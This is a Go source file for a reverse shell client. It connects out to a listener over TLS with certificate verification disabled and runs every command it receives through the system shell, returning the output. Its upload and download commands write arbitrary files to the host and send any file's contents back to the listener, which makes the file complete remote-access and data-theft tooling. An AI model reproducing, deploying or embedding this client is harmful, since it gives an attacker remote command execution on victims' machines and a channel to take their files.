package client

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// ReverseClient represents a reverse shell client
type ReverseClient struct {
	target            string
	conn              *tls.Conn
	reader            *bufio.Reader
	writer            *bufio.Writer
	isConnected       bool
	currentUploadPath string
	uploadChunks      []string
}

func compressToHex(data []byte) (string, error) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(data); err != nil {
		return "", err
	}
	if err := gz.Close(); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf.Bytes()), nil
}

func decompressHex(payload string) ([]byte, error) {
	compressed, err := hex.DecodeString(payload)
	if err != nil {
		return nil, err
	}
	gz, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, err
	}
	defer gz.Close()
	return io.ReadAll(gz)
}

// NewReverseClient creates a new reverse client
func NewReverseClient(target string) *ReverseClient {
	return &ReverseClient{
		target: target,
	}
}

// Connect establishes connection to the listener
func (rc *ReverseClient) Connect() error {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	log.Printf("Connecting to listener at %s...", rc.target)
	conn, err := tls.Dial("tcp", rc.target, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to connect to listener: %v", err)
	}

	rc.conn = conn
	rc.reader = bufio.NewReaderSize(conn, 1024*1024) // allow large commands (chunked uploads)
	rc.writer = bufio.NewWriterSize(conn, 1024*1024)
	rc.isConnected = true

	log.Println("Connected to listener successfully")
	return nil
}

// IsConnected returns whether the client is connected
func (rc *ReverseClient) IsConnected() bool {
	return rc.isConnected && rc.conn != nil
}

// Close closes the connection
func (rc *ReverseClient) Close() error {
	rc.isConnected = false
	if rc.conn != nil {
		return rc.conn.Close()
	}
	return nil
}

// ExecuteCommand runs a shell command and returns output
func (rc *ReverseClient) ExecuteCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

// HandleCommands listens for commands and executes them
func (rc *ReverseClient) HandleCommands() error {
	var cmdBuffer strings.Builder

	for {
		// Set read deadline to allow graceful shutdown
		rc.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		line, err := rc.reader.ReadString('\n')
		rc.conn.SetReadDeadline(time.Time{})

		cmdBuffer.WriteString(line)

		if errors.Is(err, bufio.ErrBufferFull) {
			// Command line exceeded buffer; keep accumulating until newline
			if cmdBuffer.Len() > 10*1024*1024 { // prevent unbounded growth
				cmdBuffer.Reset()
			}
			continue
		}

		if err != nil {
			if err == io.EOF {
				return nil
			}
			if netErr, ok := err.(interface{ Timeout() bool }); ok && netErr.Timeout() {
				continue
			}
			return fmt.Errorf("read error: %v", err)
		}

		command := strings.TrimSpace(cmdBuffer.String())
		cmdBuffer.Reset()
		if command == "" {
			continue
		}

		// Handle keepalive ping
		if command == "PING" {
			rc.writer.WriteString("PONG\n<<<END_OF_OUTPUT>>>\n")
			rc.writer.Flush()
			continue
		}

		log.Printf("Received command: %s", command)

		if command == "exit" {
			return nil
		}

		// handle file transfers before shell execution
		if strings.HasPrefix(command, "START_UPLOAD ") {
			parts := strings.SplitN(command, " ", 3)
			if len(parts) != 3 {
				rc.writer.WriteString("Invalid start_upload command\n<<<END_OF_OUTPUT>>>\n")
				rc.writer.Flush()
				continue
			}
			remotePath := parts[1]
			// Store the path for chunk collection
			rc.currentUploadPath = remotePath
			rc.uploadChunks = []string{}
			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
			rc.writer.Flush()
			continue
		}

		if strings.HasPrefix(command, "UPLOAD_CHUNK ") {
			if rc.currentUploadPath == "" {
				rc.writer.WriteString("No active upload\n<<<END_OF_OUTPUT>>>\n")
				rc.writer.Flush()
				continue
			}
			chunk := strings.TrimPrefix(command, "UPLOAD_CHUNK ")
			rc.uploadChunks = append(rc.uploadChunks, chunk)
			rc.writer.WriteString("OK\n<<<END_OF_OUTPUT>>>\n")
			rc.writer.Flush()
			continue
		}

		if strings.HasPrefix(command, "END_UPLOAD ") {
			parts := strings.SplitN(command, " ", 2)
			if len(parts) != 2 {
				rc.writer.WriteString("Invalid end_upload command\n<<<END_OF_OUTPUT>>>\n")
				rc.writer.Flush()
				continue
			}
			remotePath := parts[1]

			// Reconstruct and write file
			fullData := strings.Join(rc.uploadChunks, "")
			data, err := decompressHex(fullData)
			if err != nil {
				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				rc.currentUploadPath = ""
				rc.uploadChunks = []string{}
				continue
			}
			if err := os.WriteFile(remotePath, data, 0644); err != nil {
				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				rc.currentUploadPath = ""
				rc.uploadChunks = []string{}
				continue
			}
			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n<<<END_OF_OUTPUT>>>\n", len(data), remotePath))
			rc.writer.Flush()
			rc.currentUploadPath = ""
			rc.uploadChunks = []string{}
			continue
		}

		// handle file transfers before shell execution
		if strings.HasPrefix(command, "UPLOAD ") {
			parts := strings.SplitN(command, " ", 3)
			if len(parts) != 3 {
				rc.writer.WriteString("Invalid upload command\n<<<END_OF_OUTPUT>>>\n")
				rc.writer.Flush()
				continue
			}
			remotePath := parts[1]
			payload := parts[2]
			data, err := decompressHex(payload)
			if err != nil {
				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				continue
			}
			if err := os.WriteFile(remotePath, data, 0644); err != nil {
				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				continue
			}
			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n<<<END_OF_OUTPUT>>>\n", len(data), remotePath))
			rc.writer.Flush()
			continue
		}

		if strings.HasPrefix(command, "DOWNLOAD ") {
			parts := strings.SplitN(command, " ", 2)
			if len(parts) != 2 {
				rc.writer.WriteString("Invalid download command\n<<<END_OF_OUTPUT>>>\n")
				rc.writer.Flush()
				continue
			}
			remotePath := parts[1]
			data, err := os.ReadFile(remotePath)
			if err != nil {
				rc.writer.WriteString(fmt.Sprintf("Read error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				continue
			}
			encoded, err := compressToHex(data)
			if err != nil {
				rc.writer.WriteString(fmt.Sprintf("Encode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
				rc.writer.Flush()
				continue
			}
			rc.writer.WriteString(fmt.Sprintf("DATA %s\n<<<END_OF_OUTPUT>>>\n", encoded))
			rc.writer.Flush()
			continue
		}

		output := rc.ExecuteCommand(command)
		rc.writer.WriteString(output)
		rc.writer.WriteString("<<<END_OF_OUTPUT>>>\n")
		rc.writer.Flush()
	}
}
